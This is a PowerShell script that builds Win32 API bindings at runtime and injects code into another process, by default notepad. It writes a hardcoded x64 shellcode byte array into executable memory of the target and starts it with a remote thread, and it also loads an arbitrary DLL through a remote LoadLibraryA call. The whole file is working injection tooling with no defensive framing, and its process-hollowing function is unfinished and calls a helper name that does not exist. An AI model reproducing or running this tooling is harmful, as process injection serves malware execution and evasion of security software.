param(
    [uint32]$targetPID = (Get-Process "notepad" -ErrorAction SilentlyContinue).Id,

    [switch]$shc,
    [Byte[]]$shcBytes,

    [string]$dllPath = "$PSScriptRoot\in.dll"
)

# Setup | Type builder
$modBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Proxy')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('ProxyMod')
[System.Reflection.Emit.TypeBuilder]$typeBuilder = $modBuilder.DefineType('K32', 'Public,Class')

# Setup | Constants
$VM_OP = 0x0008
$VM_WRITE = 0x0020
$VM_READ = 0x0010
$CREATE_THREAD = 0x0002
$QUERY_INFO = 0x0400 # Often needed to verify process state

[uint32]$dwAccess = $VM_OP -bor $VM_WRITE -bor $VM_READ -bor $CREATE_THREAD -bor $QUERY_INFO

# Methods | Console
function conwrite {
    param(
        [bool]$do = $true,
        [string]$name = "---",
        [string]$msg,
        [string]$data,
        [ConsoleColor]$nameColor = 'Yellow',
        [ConsoleColor]$msgColor = 'White',
        [ConsoleColor]$dataColor = 'Gray'
    )

    if (-not $do) {return}

    $hasData = -not [string]::IsNullOrWhiteSpace($data)

    Write-Host "(" -fore $dataColor -NoNewline
    Write-Host "$($name.ToUpper())" -fore $nameColor -NoNewline
    Write-Host ") " -fore $dataColor

    Write-Host "| Msg: " -fore $dataColor -NoNewline
    Write-Host "$msg" -fore $msgColor

    if ($hasData) {
        Write-Host "{ " -fore $dataColor
        Write-Host "$data" -fore $dataColor
        Write-Host "}" -fore $dataColor    
    }
}

# Methods | Win API
function mapApi {
    param(
        [string]$dll,
        [string]$name, 
        [type]$retType, 
        [type[]]$params
    )
    $attr = [System.Reflection.MethodAttributes]"Public, Static, PinvokeImpl"
    $netConv = [System.Reflection.CallingConventions]::Standard
    $win32Conv = [System.Runtime.InteropServices.CallingConvention]::Winapi
    $cset = [System.Runtime.InteropServices.CharSet]::Ansi
    $mb = $typeBuilder.DefinePInvokeMethod($name, $dll, $attr, $netConv, $retType, $params, $win32Conv, $cset)
    $mb.SetImplementationFlags(
        $mb.GetMethodImplementationFlags() -bor
        [System.Reflection.MethodImplAttributes]::PreserveSig
    )
    $dllImportCtor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor([string])
    $dllImportProp = [System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $cab = New-Object System.Reflection.Emit.CustomAttributeBuilder(
        $dllImportCtor,
        @($dll),
        @($dllImportProp),
        @($true)
    )
    $mb.SetCustomAttribute($cab)
}

# Init | Essential Win32 API
mapApi "kernel32.dll" "OpenProcess" ([intptr]) @([uint32], [bool], [uint32])
mapApi "kernel32.dll" "VirtualAllocEx" ([intptr]) @([intptr], [intptr], [uintptr], [uint32], [uint32])
mapApi "kernel32.dll" "WriteProcessMemory" ([bool])   @([intptr], [intptr], [Byte[]], [uintptr], [uintptr])
mapApi "kernel32.dll" "CreateRemoteThread" ([intptr]) @([intptr], [intptr], [uintptr], [intptr], [intptr], [uint32], [intptr])

mapApi "kernel32.dll" "GetModuleHandle" ([intptr]) @([string])
mapApi "kernel32.dll" "GetProcAddress" ([intptr]) @([intptr], [string])
mapApi "psapi.dll" "EnumProcessModules" ([bool])   @([intptr], [intptr[]], [uint32], [uint32])
mapApi "psapi.dll" "GetModuleFileNameExA" ([uint32]) @([intptr], [intptr], [System.Text.StringBuilder], [uint32])

$K32 = $typeBuilder.CreateType()

# Fetch | Target process
$hProc = $K32::OpenProcess($dwAccess, $false, $targetPID)

# Methods | Injections
function injectshc {
    param(
        [Byte[]]$shellcode = @(0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x58, 0x20, 0x31, 0xC0, 0x8B, 0x43, 0x3C, 0x48, 0x01, 0xD8, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xD8, 0x48, 0x89, 0xC6, 0x31, 0xC0, 0x8B, 0x46, 0x20, 0x48, 0x01, 0xD8, 0x49, 0x89, 0xC1, 0x48, 0x31, 0xC9, 0x48, 0xFF, 0xC9, 0x49, 0xBA, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x48, 0xFF, 0xC1, 0x31, 0xC0, 0x41, 0x8B, 0x04, 0x89, 0x48, 0x01, 0xD8, 0x4C, 0x39, 0x10, 0x75, 0xEF, 0x31, 0xC0, 0x8B, 0x46, 0x24, 0x48, 0x01, 0xD8, 0x0F, 0xB7, 0x0C, 0x48, 0x31, 0xC0, 0x8B, 0x46, 0x1C, 0x48, 0x01, 0xD8, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD8, 0x48, 0x89, 0xC7, 0x48, 0x31, 0xC0, 0x50, 0x48, 0xB8, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x00, 0x00, 0x50, 0x48, 0xB8, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x50, 0x48, 0x89, 0xE2, 0x48, 0x89, 0xD9, 0x48, 0x83, 0xEC, 0x28, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x28, 0x48, 0x83, 0xC4, 0x18, 0x49, 0x89, 0xC7, 0x48, 0xB8, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x00, 0x50, 0x49, 0x89, 0xE6, 0x48, 0x31, 0xC0, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0x50, 0xC7, 0x44, 0x24, 0x20, 0x68, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x5C, 0x01, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x44, 0x24, 0x60, 0x05, 0x00, 0x4C, 0x8D, 0x64, 0x24, 0x20, 0x4C, 0x8D, 0x2C, 0x24, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x31, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4C, 0x89, 0x64, 0x24, 0x40, 0x4C, 0x89, 0x6C, 0x24, 0x48, 0x48, 0x31, 0xC9, 0x4C, 0x89, 0xF2, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x41, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x50, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00)
    )

    $conname = "InjectSHC"

    # Check | Process handle
    if ($hProc -eq [IntPtr]::Zero -or $hProc -eq 0) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        conwrite -name $conname -msg "Failed to get handle on PID: $targetPID. Err: $err" -msgColor Red
        return
    } else {
        conwrite -name $conname -msg "Got handle on PID: $targetPID as $hProc"
    }

    # Shellcode | Patch
    $shellcode += 0xC3 # Append ret to handle thread exit
    $shcLength = [uintptr][uint64]$shellcode.Length

    # Shellcode | Allocate, write, thread
    [intptr]$pRemoteMem = $K32::VirtualAllocEx($hProc, [intptr]::Zero, $shcLength, [uint32]0x3000, [uint32]0x40)

    $K32::WriteProcessMemory($hProc, $pRemoteMem, $shellcode, $shcLength, [uintptr]::Zero)

    $hThread = $K32::CreateRemoteThread($hProc, [intptr]::Zero, [UIntPtr]::Zero, $pRemoteMem, [intptr]::Zero, [uint32]0, [intptr]::Zero)

    # Console
    conwrite -name $conname -msg "Injected shellcode at $($pRemoteMem.ToString("X")) in $PID" -msgColor Green
}

function injectdll {
    param(
        [string]$dllPath
    )

    $conname = "InjectDLL"

    # Map | Remote Kernel32 API
    $localBase = $K32::GetModuleHandle("kernel32.dll")
    $localLL   = $K32::GetProcAddress($localBase, "LoadLibraryA")
    $llOffset  = $localLL.ToInt64() - $localBase.ToInt64()

    # Enumerate remote modules
    $modBuf   = New-Object IntPtr[] 256
    $cbNeeded = [uint32]0
    $K32::EnumProcessModules($hProc, $modBuf, (256 * [IntPtr]::Size), $cbNeeded) | Out-Null

    $remoteKernel32Base = [IntPtr]::Zero
    $sb = New-Object System.Text.StringBuilder 260

    foreach ($hMod in $modBuf) {
        if ($hMod -eq [IntPtr]::Zero) { continue }
        $sb.Clear() | Out-Null
        $K32::GetModuleFileNameExA($hProc, $hMod, $sb, 260) | Out-Null
        if ($sb.ToString() -imatch 'kernel32\.dll$') {
            $remoteKernel32Base = $hMod
            break
        }
    }

    $remoteLL = [IntPtr]($remoteKernel32Base.ToInt64() + $llOffset)

    # Write | DLL path into memory
    $dllBytes = [System.Text.Encoding]::Default.GetBytes($dllPath + "`0")
    $dllPLength = [uintptr][uint64]$dllBytes.Length

    $MEM_COMMIT  = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_RW     = 0x04

    $allocAddr = $K32::VirtualAllocEx($hProc, [IntPtr]::Zero, $dllPLength, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_RW)
    $K32::WriteProcessMemory($hProc, $allocAddr, $dllBytes, $dllPLength, [uintptr]::Zero) | Out-Null

    # Create | Remote thread at LoadLibraryA and pass allocated DLL path
    $hThread = $K32::CreateRemoteThread($hProc, [IntPtr]::Zero, [uintptr]::Zero, $remoteLL, $allocAddr, 0, [IntPtr]::Zero)

    # Console
    conwrite -name $conname -msg "Injected [$dllPath] into $targetPID at $($allocAddr.ToString('X'))"
}

function injectpe {
    param(
        [string]$pePath
    )

    $conname = "InjectPE"

    # Map | Kernel32
    map-api "kernel32.dll" "GetThreadContext" ([bool]) @([intptr], [intptr].MakeByRefType())
    map-api "kernel32.dll" "SetThreadContext" ([bool]) @([intptr], [intptr])
    map-api "kernel32.dll" "ReadProcessMemory" ([bool]) @([intptr], [intptr], [intptr], [uint32], [uint32].MakeByRefType())
    map-api "ntdll.dll" "NtUnmapViewOfSection" () @()

    $K32 = $typeBuilder.CreateType()
}

# Execute
if ($shc) {
    if ($shcBytes -ne $null) {
        injectshc -shellcode $shcBytes   
    } else {
        injectshc
    }
} else {
    injectdll -dllPath $dllPath
}

# Module
Export-ModuleMember -Function injectshc, injectdll, injectpe